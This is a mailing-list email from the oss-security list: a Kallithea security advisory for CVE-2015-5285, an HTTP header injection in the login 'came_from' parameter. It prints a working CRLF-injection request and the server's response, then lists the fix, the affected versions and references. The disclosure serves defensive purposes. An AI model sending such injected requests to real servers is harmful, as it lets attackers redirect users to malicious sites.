X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4144" "Friday" "2" "October" "2015" "22:13:01" "+0200" "Andrew Shadura" "andrew@shadura.me" "<560EE54D.3030508@shadura.me>" "144" "[oss-security] CVE-2015-5285: Kallithea: HTTP header injection" nil nil nil "10" "2015100220:13:01" "[oss-security] CVE-2015-5285: Kallithea: HTTP header injection" (number mark "        andrew@shadu Oct  2  144/4144  " thread-indent "\"[oss-security] CVE-2015-5285: Kallithea: HTTP header injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 28536 invoked by uid 550); 2 Oct 2015 20:13:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28249 invoked from network); 2 Oct 2015 20:13:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=shadura.me; s=a;
	h=Content-Type:MIME-Version:Date:Message-ID:Subject:From:To; bh=XQevrgiVRY+ZRGo+zkKGUjUenoetAxbsI0kkI+Hbagc=;
	b=LekTCeM5mgDWtEYJxQt18mpWZE/hOnrD7NZ3YFxM1U+RKsNazakdKXdPbr2WIyXGwjCQFxutNBxVBbnfOrbI7e5LsUHYlKC4FaQXo6+IadcpOEHSCOJTdU/4c3Ffc/s5nTNSD7Ts5vttBa1jOXkqDbicxVe7GXqZYtO5Su+Ced0=;
X-Enigmail-Draft-Status: N1110
Message-ID: <560EE54D.3030508@shadura.me>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.2.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="oAAeSnliEMsrj40jtKOU5s6uPCCdTp3Ov"
Date: Fri, 2 Oct 2015 22:13:01 +0200
From: Andrew Shadura <andrew@shadura.me>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-5285: Kallithea: HTTP header injection
To: oss-security@lists.openwall.com

--oAAeSnliEMsrj40jtKOU5s6uPCCdTp3Ov
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

HTTP header injection

Synopsis
=3D=3D=3D=3D=3D=3D=3D=3D

A vulnerability has been found in Kallithea, allowing attackers to inject
arbitrary headers into the server response for certain URLs.

Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

HTTP header injection was possible in login-related code of Kallithea,
allowing
attackers to inject arbitrary headers into the server responses.

The vulnerability affects the `came_from` `GET` parameter.

Example of a malicious request:

    GET
/_admin/login?came_from=3D1%0d%0aX-Forwarded-Host%3a%20http://zeroscience.m=
k%01%02%0d%0aLocation%3a%20http://zeroscience.mk
HTTP/1.1
    Host: 192.168.0.28:8080
    Content-Length: 0
    Cache-Control: max-age=3D0
    Accept:
text/html,application/xhtml+xml,application/xml;q=3D0.9,image/webp,*/*;q=3D=
0.8
    Origin: http://192.168.0.28:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Referer: http://192.168.0.28:8080/_admin/login?came_from=3D%2F
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=3D0.8
    Cookie:
kallithea=3D3090b35b3e37ba350d71b62c240c50bf87932f0d7e6b1a600cba4e0e890b7e2=
9e253b438

Corresponding response:

    HTTP/1.1 302 Found
    Cache-Control: no-cache
    Content-Length: 411
    Content-Type: text/html; charset=3DUTF-8
    Date: Mon, 21 Sep 2015 13:58:05 GMT
    Location: http://192.168.0.28:8080/_admin/d47b5
    X-Forwarded-Host: http://zeroscience.mk
    Location: http://zeroscience.mk
    Pragma: no-cache
    Server: waitress

    <html>
     <head>
      <title>302 Found</title>
     </head>
     <body>
      <h1>302 Found</h1>
      The resource was found at <a href=3D"http://192.168.0.28:8080/_admin/1
    X-Forwarded-Host: http://zeroscience.mk
    Location: http://zeroscience.mk ">http://192.168.0.28:8080/_admin/1
    X-Forwarded-Host: http://zeroscience.mk
    Location: http://zeroscience.mk </a>;
    you should be redirected automatically.


     </body>
    </html>

Impact
=3D=3D=3D=3D=3D=3D

The bug allows an attacker to override important response headers,
possibly redirecting users
to a malicious website or make other middleware misbehave when it trusts
the response headers.

Resolution
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The Kallithea project has fixed this issue in the stable branch. Users
are recommended to
upgrade to the latest 0.3 release.

Affected versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The issue is present in Kallithea versions before 0.3.

Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Thanks to Gjoko Krstic of Zero Science Lab for reporting this issue.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[0] Kallithea Project
    <https://kallithea-scm.org/>

[1] CVE-2015-5285
    <http://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-5285>

[2] Kallithea: Security Notice CVE-2015-5285
    <https://kallithea-scm.org/security/cve-2015-5285.html>

[3] Mercurial changeset fixing the issue

<https://kallithea-scm.org/repos/kallithea/changeset/38d1c99cd0005c1df5a376=
92615356c918dbe068>

[4] Zero Science Lab
    <http://www.zeroscience.mk/en/>

--=20
Cheers,
  Andrew Shadura
  on behalf of Kallithea Security Team


--oAAeSnliEMsrj40jtKOU5s6uPCCdTp3Ov
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBCAAGBQJWDuVOAAoJEJ1bI/kYT6UUrB8IAIpL58wnOx+gtvMaob3tvmLX
nXJzfD0JmVKfIf8j3YWkLt3o0B8dMEttxoqbdcSFMo409bLhPbZY8eT2KogmbIyt
cERCGxC2VrsMoo7b8RJsQngZhTyY0k7EuxVDQfnI7cHNSlsoxQR066zUuu6d8UqD
e965cFHMUmDHpI3JeF7lLl/oyvzH/CmHEN2Vo+fso5y9BJCPvINNRSPgDYTSdJLi
lwxhxcPjtSMQZdBW/8DEV+WLrockBehJh0pUs7JR3pzwc/PHwgOSOn9QLhegtCC1
FxwWI4IV77a9Ou1/Sf7kMmfY3ewzxyGV9Orv4TtDCAYdtejXW67ZsxVyPR8U5LA=
=dwLZ
-----END PGP SIGNATURE-----

--oAAeSnliEMsrj40jtKOU5s6uPCCdTp3Ov--
